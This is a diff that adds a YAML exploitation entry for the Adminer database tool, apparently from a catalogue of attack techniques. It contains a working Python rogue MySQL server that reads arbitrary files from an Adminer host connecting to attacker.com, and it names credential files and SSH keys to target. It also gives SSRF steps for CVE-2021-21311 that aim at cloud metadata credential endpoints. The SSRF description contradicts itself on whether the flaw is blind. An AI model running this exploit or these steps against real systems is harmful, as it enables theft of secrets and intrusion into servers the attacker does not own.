@@ -1,0 +1,85 @@
+---
+comment: |
+  Adminer (formerly phpMinAdmin) is a single-file PHP database management tool.
+  Two independent exploitation paths exist:
+
+  1. Arbitrary file read via rogue MySQL server (Adminer <= 4.6.2): Adminer supports
+     LOAD DATA LOCAL INFILE, which allows a MySQL server to request files from the
+     client. By connecting Adminer to an attacker-controlled rogue MySQL server, the
+     server can instruct Adminer to read any file accessible to the PHP process and
+     transmit its contents to the attacker.
+
+  2. SSRF via Elasticsearch driver (CVE-2021-21311, Adminer 4.0.0-4.7.8): The
+     Elasticsearch login driver makes an outbound HTTP request to the server URL
+     specified in the login form without validation, enabling arbitrary HTTP requests
+     from the Adminer server to internal network endpoints.
+functions:
+  file-read:
+  - code: "#!/usr/bin/env python3\n# Rogue MySQL server \u2014 reads an arbitrary\
+      \ file from the Adminer host.\n# Usage: python3 rogue_mysql.py [target_file]\n\
+      # Then connect Adminer to attacker.com:3306 using any credentials.\nimport socket,\
+      \ sys\n\nFILE = sys.argv[1] if len(sys.argv) > 1 else '/etc/passwd'\n\ndef pkt(data,\
+      \ seq):\n    return len(data).to_bytes(3, 'little') + seq.to_bytes(1, 'little')\
+      \ + data\n\ns = socket.socket()\ns.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,\
+      \ 1)\ns.bind(('0.0.0.0', 3306))\ns.listen(1)\nprint(f'[*] Listening :3306, targeting:\
+      \ {FILE}')\n\nconn, addr = s.accept()\nprint(f'[+] Connection from {addr}')\n\
+      \n# Send minimal MySQL greeting (protocol 10, version 5.7.0)\nconn.send(pkt(b'\\\
+      x0a5.7.0\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n         \
+      \     b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00',\
+      \ 0))\nconn.recv(4096)  # client auth packet\nconn.send(pkt(b'\\x00\\x00\\x00\\\
+      x02\\x00\\x00\\x00', 2))  # OK\nconn.recv(4096)  # COM_QUERY from Adminer\n\n\
+      # Issue LOCAL DATA INFILE request for the target file\nconn.send(pkt(b'\\xfb'\
+      \ + FILE.encode(), 1))\n\n# Receive and reassemble the file content\ndata =\
+      \ b''\nwhile True:\n    chunk = conn.recv(65536)\n    if not chunk:\n      \
+      \  break\n    plen = int.from_bytes(chunk[:3], 'little')\n    data += chunk[4:4\
+      \ + plen]\n    if plen == 0:\n        break\nconn.send(pkt(b'\\x00\\x00\\x00\\\
+      x02\\x00\\x00\\x00', 2))  # OK\n\nprint(f'\\n[+] Contents of {FILE}:\\n{data.decode(errors=\"\
+      replace\")}')\nconn.close()\ns.close()\n"
+    comment: "Adminer <= 4.6.2 supports LOAD DATA LOCAL INFILE, which enables a MySQL\
+      \ server\nto pull arbitrary files from the connecting client (Adminer's PHP\
+      \ process).\n\nAttack flow:\n1. Run the rogue MySQL server above on the attacker\
+      \ machine (port 3306).\n2. Navigate to the Adminer login page on the victim\
+      \ server.\n3. In the login form, set Server to attacker.com, enter any username/password/database.\n\
+      4. Click Login \u2014 Adminer connects to the rogue server. The rogue server\
+      \ responds\n   with a LOAD DATA LOCAL INFILE request, and Adminer transmits\
+      \ the file contents.\n\nUseful target files:\n- /etc/passwd\n- /var/www/html/wp-config.php\
+      \ (WordPress credentials)\n- /var/www/html/.env (Laravel/Symfony secrets)\n\
+      - ~/.ssh/id_rsa (SSH private keys)\n\nThe PHP process user (www-data, apache,\
+      \ nginx) determines which files are readable.\nFixed in Adminer 4.6.3.\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      <= 4.6.2
+  ssrf:
+  - code: |
+      # Navigate to the Adminer login page and select "Elasticsearch" as the system.
+      # Set the Server field to an internal URL and click Login.
+      # Adminer makes an outbound HTTP GET request to the specified URL.
+
+      # Examples of useful targets:
+      # Cloud metadata (AWS IMDSv1):
+      #   http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      # Cloud metadata (GCP):
+      #   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+      # Cloud metadata (Azure):
+      #   http://169.254.169.254/metadata/instance?api-version=2021-02-01
+      # Internal services:
+      #   http://192.168.1.1/admin
+      #   http://localhost:8080/actuator/env
+
+      # The HTTP response from the internal service is reflected in the Adminer error
+      # message or login page, making this a semi-blind SSRF.
+    comment: |
+      CVE-2021-21311: the Elasticsearch driver in Adminer passes the user-supplied
+      Server field directly to an HTTP client without validation. Adminer makes a GET
+      request to http://<server>/ when the Login button is clicked.
+
+      The full response body from the internal service is reflected in the Adminer
+      interface, making this a non-blind SSRF useful for internal network probing and
+      cloud metadata extraction.
+      Fixed in Adminer 4.7.9.
+    contexts:
+      unauthenticated:
+    version: |-
+      4.0.0 - 4.7.8
+...
